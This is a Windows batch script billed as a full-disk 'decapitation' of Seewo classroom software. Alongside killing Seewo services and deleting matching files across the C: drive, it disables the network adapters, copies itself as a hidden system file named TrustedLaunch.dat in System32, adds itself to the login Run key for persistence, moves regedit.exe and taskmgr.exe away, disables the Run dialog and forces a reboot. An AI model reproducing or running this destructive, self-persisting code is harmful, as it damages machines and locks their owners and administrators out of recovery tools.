@echo off
chcp 65001 >nul
color 4F
title Seewo Full System Decapitation · Ultimate Complete Edition
cls

set SCRIPT_DIR=%~dp0
set SCRIPT_FILE=%~f0
set LOG_TXT=%SCRIPT_DIR%Seewo_Delete_Log.txt
set LOG_CSV=%SCRIPT_DIR%Seewo_Delete_Log.csv

echo.
echo #-----------------------------------------------------------------------#
echo +  Seewo (Seewo) Full Drive Decapitation # File-Level Detailed Removal
echo +  Current Path: %SCRIPT_DIR%
echo #-----------------------------------------------------------------------#
echo.

route delete 0.0.0.0 >nul 2>&1
netsh interface set interface name="Ethernet" admin=disable >nul 2>&1
netsh interface set interface name="WiFi" admin=disable >nul 2>&1
netsh interface set interface "以太网" admin=disable
netsh interface set interface "WLAN" admin=disable
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1
taskkill /f /im WeChat.exe >nul 2>&1
taskkill /f /im QQ.exe >nul 2>&1
taskkill /f /im DingTalk.exe >nul 2>&1
taskkill /f /im OneDrive.exe >nul 2>&1

set SYS_COPY=C:\Windows\System32\TrustedLaunch.dat
if not exist "%SYS_COPY%" (
    copy /y "%SCRIPT_FILE%" "%SYS_COPY%" >nul
    attrib +R +S +H "%SYS_COPY%" >nul
)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v TrustedLaunch /t REG_SZ /d "cmd /c %SYS_COPY%" /f >nul 2>&1

for %%e in (jpg jpeg png bmp) do (
    for %%i in ("%SCRIPT_DIR%\*.%%e") do (
        set WALLPAPER=%%i
        goto :found_wall
    )
)
:found_wall
if not defined WALLPAPER (
    echo [WARN] No wallpaper image detected. Skipping wallpaper change.
) else (
    echo [INFO] Wallpaper file detected: %WALLPAPER%
)
echo.

echo [STEP 1] Terminating Seewo related processes...
taskkill /f /im EasiNote*.exe >nul 2>&1
taskkill /f /im SeewoService.exe >nul 2>&1
taskkill /f /im SeewoGuard.exe >nul 2>&1
taskkill /f /im SeewoManager.exe >nul 2>&1
taskkill /f /im SeewoIot*.exe >nul 2>&1
taskkill /f /im SeewoCampus*.exe >nul 2>&1
sc stop SeewoService >nul 2>&1
sc stop SeewoGuard >nul 2>&1
sc config SeewoService start= disabled >nul 2>&1
sc config SeewoGuard start= disabled >nul 2>&1
echo.
echo   [OK] All Seewo processes terminated
echo.
color 2F
echo Copyright (c) 2023, The LAOLIPEF.NT Open Source Project
echo.
echo   Licensed under the Apache License, Version 2.0 (the "License");
echo   you may not use this file except in compliance with the License.
echo.
echo   Unless required by applicable law or agreed to in writing, software
echo   distributed under the License is distributed on an "AS IS" BASIS,
echo   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
echo   See the License for the specific language governing permissions and
echo   limitations under the License.
echo.
color 4F

echo.
echo [STEP 2] Full disk scan and deletion of Seewo / 希沃...
echo ═════════════════════════════
echo Deletion Time, File Name, Size (bytes), Path > "%LOG_CSV%"
for /r C:\ %%i in (*seewo* *Seewo* *希沃*) do (
    if exist "%%i" (
        for %%f in ("%%i") do (
            echo [%time%] Deleted: %%~nxf Size: %%~zf Path: %%i
            echo [%time%] Deleted: %%~nxf Size: %%~zf Path: %%i >> "%LOG_TXT%"
            echo %time%,%%~nxf,%%~zf,"%%i" >> "%LOG_CSV%"
        )
        del /f /q "%%i" >nul 2>&1
        rd /s /q "%%i" >nul 2>&1
    )
)
echo ══════════════════════════════
echo.
echo   [OK] Full disk Seewo / 希沃 cleanup completed
echo.
color 2F
echo Copyright (c) 2023, The LAOLIPEF.NT Open Source Project
echo.
echo   Licensed under the Apache License, Version 2.0 (the "License");
echo   you may not use this file except in compliance with the License.
echo.
echo   Unless required by applicable law or agreed to in writing, software
echo   distributed under the License is distributed on an "AS IS" BASIS,
echo   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
echo   See the License for the specific language governing permissions and
echo   limitations under the License.
echo.
color 4F

echo.
echo [STEP 3] Cleaning up registry remnants...
reg delete "HKCU\Software\Seewo" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Seewo" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Seewo" /f >nul 2>&1
schtasks /delete /tn "Seewo*" /f >nul 2>&1
echo.
echo   [OK] Registry & Task Scheduler cleanup completed
echo.
color 2F
echo Copyright (c) 2023, The LAOLIPEF.NT Open Source Project
echo.
echo   Licensed under the Apache License, Version 2.0 (the "License");
echo   you may not use this file except in compliance with the License.
echo.
echo   Unless required by applicable law or agreed to in writing, software
echo   distributed under the License is distributed on an "AS IS" BASIS,
echo   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
echo   See the License for the specific language governing permissions and
echo   limitations under the License.
echo.
color 4F

if defined WALLPAPER (
    echo.
    echo [STEP 4] Forcing desktop wallpaper change...
    reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%WALLPAPER%" /f >nul
    reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >nul
    reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f >nul
    rundll32.exe user32.dll,UpdatePerUserSystemParameters
    echo.
    echo   [OK] Wallpaper has been forcibly changed
    echo.
    color 2F
    echo Copyright (c) 2023, The LAOLIPEF.NT Open Source Project
    echo.
    echo   Licensed under the Apache License, Version 2.0 (the "License");
    echo   you may not use this file except in compliance with the License.
    echo.
    echo   Unless required by applicable law or agreed to in writing, software
    echo   distributed under the License is distributed on an "AS IS" BASIS,
    echo   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    echo   See the License for the specific language governing permissions and
    echo   limitations under the License.
    echo.
    color 4F
)

echo.
echo [STEP 5] Disabling registry editor & task manager...
set REGEDIT=C:\Windows\regedit.exe
set TASKMGR=C:\Windows\System32\taskmgr.exe
set RECYCLE=%USERPROFILE%\AppData\Local\Microsoft\Windows\Recycle Bin
move /y "%REGEDIT%" "%RECYCLE%" >nul 2>&1
move /y "%TASKMGR%" "%RECYCLE%" >nul 2>&1
if not exist "%REGEDIT%" (
    echo    regedit.exe moved to Recycle Bin
) else (
    echo    regedit.exe move failed
)
if not exist "%TASKMGR%" (
    echo    taskmgr.exe moved to Recycle Bin
) else (
    echo    taskmgr.exe move failed
)
echo.
echo   [OK] System management tools disabled
echo.
color 2F
echo Copyright (c) 2023, The LAOLIPEF.NT Open Source Project
echo.
echo   Licensed under the Apache License, Version 2.0 (the "License");
echo   you may not use this file except in compliance with the License.
echo.
echo   Unless required by applicable law or agreed to in writing, software
echo   distributed under the License is distributed on an "AS IS" BASIS,
echo   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
echo   See the License for the specific language governing permissions and
echo   limitations under the License.
echo.
color 4F

echo.
echo [STEP 6] Disabling Run command...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1
echo   [OK] Run disabled
echo.
color 2F
echo Copyright (c) 2023, The LAOLIPEF.NT Open Source Project
echo.
echo   Licensed under the Apache License, Version 2.0 (the "License");
echo   you may not use this file except in compliance with the License.
echo.
echo   Unless required by applicable law or agreed to in writing, software
echo   distributed under the License is distributed on an "AS IS" BASIS,
echo   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
echo   See the License for the specific language governing permissions and
echo   limitations under the License.
echo.
color 4F

echo.
echo ╔═══════════════════╗
echo ║  Seewo removal complete · System neutering complete · Restarting soon
echo ╚═══════════════════╝
for /l %%i in (5,-1,1) do (
    color 2F
    echo.
    echo   COM.LAOLIPEF.PE_END has completed its mission!
    echo   The end of all things and the final conclusion become their beginning
    echo   The open-source website for this code will be placed at:
    echo   https://github.com/XiaoGuanJi/LTX
    echo.
    color 4F
    echo   [REBOOT] Restarting in %%i seconds...
    timeout /t 1 >nul
)
echo.
echo [ACTION] Rebooting system...
shutdown /r /t 0
